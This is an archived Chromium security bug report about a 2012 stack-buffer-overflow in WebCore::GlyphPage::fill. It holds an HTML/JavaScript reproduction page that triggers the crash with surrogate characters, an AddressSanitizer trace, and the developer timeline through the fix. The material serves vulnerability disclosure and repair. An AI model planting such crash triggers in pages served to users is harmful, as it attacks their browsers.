# Security: stack-buffer-overflow in WebCore::GlyphPage::fill with surrogate characters

| Field | Value |
|-------|-------|
| **Issue ID** | [40056397](https://issues.chromium.org/issues/40056397) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink |
| **Reporter** | mi...@gmail.com |
| **Assignee** | ba...@chromium.org |
| **Created** | 2012-04-08 |
| **Bounty** | $500.00 |

## Description

**This template is ONLY for reporting security bugs. Please use a different**  

**template for other types of bug reports.**

**VULNERABILITY DETAILS**  

stack-buffer-overflow in WebCore::GlyphPage::fill with surrogate characters

**VERSION**  

Chrome Version: stable + dev

Chromium 20.0.1095.0 (Developer Build 131299)  

OS Linux  

WebKit 536.6 (@113522)

Operating System: 64bit linux

**REPRODUCTION CASE**

<html>
<head>
<style>
#el0 {
-webkit-writing-mode:vertical-lr;
}
</style>
<script>
onload = function() {
el0=document.createElement('div')
el0.setAttribute('id','el0')
document.body.appendChild(el0)
el0.appendChild(document.createTextNode(unescape('%ud801%udc00')))
}
</script>
</head>
<body>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: renderer + asan  

Crash State:

==22621== ERROR: AddressSanitizer stack-buffer-overflow on address 0x7fffffff43e8 at pc 0x555559c96f82 bp 0x7fffffff4010 sp 0x7fffffff4008  

READ of size 2 at 0x7fffffff43e8 thread T0  

#0 0x555559c96f82 in WebCore::GlyphPage::fill(unsigned int, unsigned int, unsigned short\*, unsigned int, WebCore::SimpleFontData const\*) ???:0  

#1 0x555559b8781f in WebCore::GlyphPageTreeNode::initializePage(WebCore::FontData const\*, unsigned int) ???:0

Address 0x7fffffff43e8 is located at offset 904 in frame <WebCore::GlyphPage::fill(unsigned int, unsigned int, unsigned short\*, unsigned int, WebCore::SimpleFontData const\*)> of T0's stack:  

This frame has 5 object(s):  

[32, 40) 'buffer.i'  

[96, 98) 'scriptIndex.i'  

[160, 162) 'featureIndex.i'  

[224, 328) 'paint'  

[384, 904) 'glyphStorage'

## Attachments

- [stable-glyphStorage.txt](attachments/stable-glyphStorage.txt) (text/x-c; charset=us-ascii, 8.0 KB)
- [glyphStorage.txt](attachments/glyphStorage.txt) (text/x-c; charset=us-ascii, 8.1 KB)
- [glyphStorage.html](attachments/glyphStorage.html) (text/html; charset=us-ascii, 399 B)
- [glyphStorage2.html](attachments/glyphStorage2.html) (text/html; charset=us-ascii, 699 B)

## Timeline

### pa...@chromium.org (2012-04-09)

I can't repro on OS X, either 18 or 20 canary. Will try on Linux Monday.

### pa...@google.com (2012-04-09)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=34727294

Uploader: palmer@chromium.org

Crash Type: 
Crash Address: 
Crash State:
  - crash stack -
  

Unminimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv95-S9IFBia6kPBV0evGOlkJ54z6TwzNX3anNemDX9QS0xCAjaVAI5FEA4cQv7aX4E8CpL1__CsVpqOHyHujV6QsTjIs19GDwR-Ol11nkHFkf300F3Mcgpq3O5fk684r_GtZlBDuvXC3h0szQylEdUNNxNfNVA

### pa...@chromium.org (2012-04-09)

ClusterFuzz can't reproduce this either. miaubiz, I notice your canary is newer than mine on OS X (I have 1093), and maybe you are running newer code than CF does as well. (Weirdly, I am getting "update server not available" right now, so I can't get the 1095 canary that you have.) It also doesn't pop on my 1091 (ToT as of a few days ago).

I'll try on piping fresh code on Monday.

### mi...@gmail.com (2012-04-09)

@pal... : I can repro it on  stable aswell. 

fwiw GlyphPage::fill is implemented in the platform specific stuff, so it wouldnät repro on mac in any case, I think mine is in Source/WebCore/platform/graphics/skia/GlyphPageTreeNodeSkia.cpp

ofcourse CF should be using that one as well. 

surrogate pairs that crash for me are atleast:

d801 dc00
d801 dc28
d801 dc4d
d801 dc4e

d847 dde0

it's always at offset 904 though, i.e. off-by-one from the glyphStorage object. and it doesn't crash any non-asan browsers. glyphStorage is also always the same size for me. :|



### pa...@google.com (2012-04-09)

I still can't get it to crash, on stable, dev, canary, or ToT. Weird. For convenience, attaching a version of miaubiz' repro that tries all the surrogate pairs he lists in the previous comment.

### in...@chromium.org (2012-04-12)

Kenichi, any idea what is going wrong with these surrogate characters.

### ba...@chromium.org (2012-04-12)

Upload the fix to WebKit bugzilla. https://bugs.webkit.org/show_bug.cgi?id=83751
Adding tkent@ and tony@ for review.

### ba...@chromium.org (2012-04-12)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-04-12)

Kenichi, you rock!!!
http://trac.webkit.org/changeset/113951

### in...@chromium.org (2012-04-12)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-04-24)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-04-30)

M19: http://trac.webkit.org/changeset/115610

### sc...@gmail.com (2012-05-10)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-05-14)

[Empty comment from Monorail migration]

### [Deleted User] (2012-05-15)

Updating status to Fixed on security bugs which were fixed when m19 went to stable.

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/122585?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40056397)*
